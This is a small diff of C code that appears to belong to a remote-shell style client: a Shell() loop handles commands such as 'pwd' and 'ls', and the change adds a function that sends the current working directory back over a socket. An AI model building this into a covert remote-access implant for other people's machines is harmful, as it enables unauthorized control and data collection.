@@ -13,6 +13,8 @@
 
 
 #define bzero(p,size) (void) memset((p), 0, (size))
+#define MAX_BUFFER_SIZE 1024
+
 
 int sock;
 
@@ -123,6 +125,14 @@ char* gsi() {
    
 }
 
+void get_pwd(char* buffer, int bufferSize) {
+    if (getcwd(buffer, bufferSize) == NULL) {
+        perror("Error al obtener el directorio actual");
+        strcpy(buffer, "");
+    }
+    send(sock, buffer, strlen(buffer), 0);
+}
+
 void Shell() {
     char buffer[1024];
     char container[1024];
@@ -144,7 +154,10 @@ void Shell() {
             printf("caca");
         }
         else if(strncmp("pwd", buffer, 3) == 0){
-            //pwd
+            char buffer[MAX_BUFFER_SIZE];
+            get_pwd(buffer, MAX_BUFFER_SIZE);
+            printf("Directorio actual: %s\n", buffer);
+            
         }
         else if(strncmp("ls", buffer, 3) == 0){
             //ls
